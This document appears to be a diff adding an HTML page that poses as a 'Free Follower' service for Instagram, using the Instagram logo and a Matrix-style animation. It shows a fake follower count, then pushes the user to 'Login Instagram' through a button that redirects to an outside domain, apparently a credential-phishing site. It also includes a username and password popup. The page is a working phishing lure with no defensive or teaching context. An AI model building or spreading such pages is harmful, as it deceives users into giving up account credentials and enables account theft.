@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Follower with Matrix Background</title>
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+            background-color: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            position: relative;
+        }
+
+        canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 0;
+        }
+
+        .container {
+            position: relative;
+            text-align: center;
+            width: 300px;
+            z-index: 1;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 8px;
+        }
+
+        .logo {
+            width: 100px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: bold;
+            margin: 20px 0;
+            color: white;
+        }
+
+        select, input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            height: 45px;
+            margin-bottom: 15px;
+            border: 1px solid #000;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            color: black;
+            background-color: #39FF14;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .submit-btn:hover {
+            background-color: #32CD32;
+        }
+
+        /* Loading and collecting screen */
+        .loading-screen, .collecting-screen, .sending-screen, .error-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 2;
+            display: none;
+        }
+
+        .loading-circle {
+            width: 40px;
+            height: 40px;
+            border: 5px solid #39FF14;
+            border-top: 5px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text, .collecting-text, .sending-text {
+            font-size: 18px;
+            color: #39FF14;
+            font-weight: bold;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .count {
+            font-size: 24px;
+            color: #39FF14;
+            margin-top: 10px; /* Add some space above the count */
+        }
+
+        /* Error Screen */
+        .error-screen {
+            background: rgba(255, 0, 0, 0.9);
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            font-size: 24px;
+            display: none; /* Initially hidden */
+        }
+
+        .error-screen p {
+            margin: 0; /* Remove margin */
+        }
+
+        /* Notification */
+        .notification {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 300px;
+            background-color: rgba(0, 0, 0, 0.9);
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            z-index: 3;
+            text-align: center; /* Center the text */
+            display: none; /* Initially hidden */
+        }
+
+        .notification h2 {
+            font-size: 20px;
+            margin: 0 0 10px 0;
+            color: red; /* Set color to red for blinking text */
+            animation: blink 1s linear infinite; /* Blink effect */
+        }
+
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        /* Login Popup */
+        .login-popup {
+            display: none; /* Initially hidden */
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 300px;
+            background: rgba(0, 0, 0, 0.9);
+            padding: 20px;
+            border-radius: 8px;
+            z-index: 4;
+        }
+
+        .login-popup img {
+            width: 80px; /* Set width for the logo */
+            margin-bottom: 10px; /* Space below the logo */
+        }
+
+        .login-popup h2 {
+            color: red; /* Color for the login message */
+            animation: blink 1s linear infinite; /* Blink effect */
+        }
+
+        .login-popup input {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+            border: 1px solid #000;
+            border-radius: 4px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .login-popup .login-btn {
+            padding: 10px 20px;
+            font-size: 16px;
+            color: black;
+            background-color: #39FF14;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="matrixCanvas"></canvas>
+    
+    <div class="container" id="formContainer">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
+        <h1>FREE FOLLOWER</h1>
+        
+        <select id="followersCount">
+            <option value="100">100 Followers</option>
+            <option value="500">500 Followers</option>
+            <option value="1000">1000 Followers</option>
+            <option value="5000">5000 Followers</option>
+            <option value="10000">10000 Followers</option>
+        </select>
+        
+        <input type="text" placeholder="Username" required id="usernameInput">
+        
+        <button class="submit-btn" onclick="startLoading()" id="submitButton">SUBMIT</button>
+    </div>
+
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-circle"></div>
+        <div class="loading-text">Searching...</div>
+    </div>
+
+    <!-- Collecting Screen -->
+    <div class="collecting-screen" id="collectingScreen">
+        <div class="collecting-text">Collecting Followers</div>
+        <div class="count" id="countingText">0</div>
+        <div>Total Followers: <span id="totalFollowers"></span></div> <!-- Added total followers label -->
+        <button class="submit-btn" onclick="showLoginNotification()" id="sendButton" style="display: none;">SEND</button>
+    </div>
+
+    <!-- Sending Screen -->
+    <div class="sending-screen" id="sendingScreen">
+        <div class="sending-text">Sending...</div>
+        <div class="sending-text">ID: <span id="fakeUsername"></span></div>
+    </div>
+
+    <!-- Notification -->
+    <div class="notification" id="notification">
+        <h2>Login Instagram to get free followers</h2>
+        <button class="submit-btn" onclick="window.location.href='http://season-event.com.tr/DS/IGX/?id=6811587584'">Login</button>
+    </div>
+
+    <!-- Login Popup -->
+    <div class="login-popup" id="loginPopup">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+        <h2>Please login to your Instagram ID to get free followers</h2>
+        <input type="text" placeholder="Username" id="loginUsername" required>
+        <input type="password" placeholder="Password" id="loginPassword" required>
+        <button class="login-btn" onclick="login()">Login</button>
+    </div>
+
+    <script>
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+
+        // Matrix animation code
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = Array.from({ length: columns }).fill(1);
+
+        function draw() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#39FF14';
+            ctx.font = fontSize + 'px monospace';
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+
+        setInterval(draw, 50);
+
+        function startLoading() {
+            document.getElementById('formContainer').style.display = 'none';
+            document.getElementById('loadingScreen').style.display = 'flex';
+            setTimeout(() => {
+                document.getElementById('loadingScreen').style.display = 'none';
+                document.getElementById('collectingScreen').style.display = 'flex';
+                startCollectingFollowers();
+            }, 2000); // Simulate loading time
+        }
+
+        function startCollectingFollowers() {
+            let totalFollowers = parseInt(document.getElementById('followersCount').value);
+            let count = 0;
+            const countingText = document.getElementById('countingText');
+            const totalFollowersText = document.getElementById('totalFollowers');
+
+            const interval = setInterval(() => {
+                count++;
+                countingText.textContent = count;
+                totalFollowersText.textContent = totalFollowers;
+
+                if (count >= totalFollowers) {
+                    clearInterval(interval);
+                    document.getElementById('collectingScreen').style.display = 'none';
+                    document.getElementById('sendingScreen').style.display = 'flex';
+                    document.getElementById('fakeUsername').textContent = document.getElementById('usernameInput').value;
+                    setTimeout(() => {
+                        showLoginNotification();
+                    }, 1000);
+                }
+            }, 50); // Simulate follower collection
+        }
+
+        function showLoginNotification() {
+            document.getElementById('notification').style.display = 'block';
+        }
+
+        function showLoginPopup() {
+            document.getElementById('loginPopup').style.display = 'block';
+            document.getElementById('notification').style.display = 'none'; // Hide the notification
+        }
+
+        function login() {
+            const username = document.getElementById('loginUsername').value;
+            const password = document.getElementById('loginPassword').value;
+            alert(`Logged in with Username: ${username}`);
+            document.getElementById('loginPopup').style.display = 'none'; // Hide the login popup
+        }
+
+        // Adjusts popup styles
+        window.onload = () => {
+            const errorScreen = document.getElementById('errorScreen');
+            errorScreen.style.display = 'none';
+        }
+    </script>
+</body>
+</html>
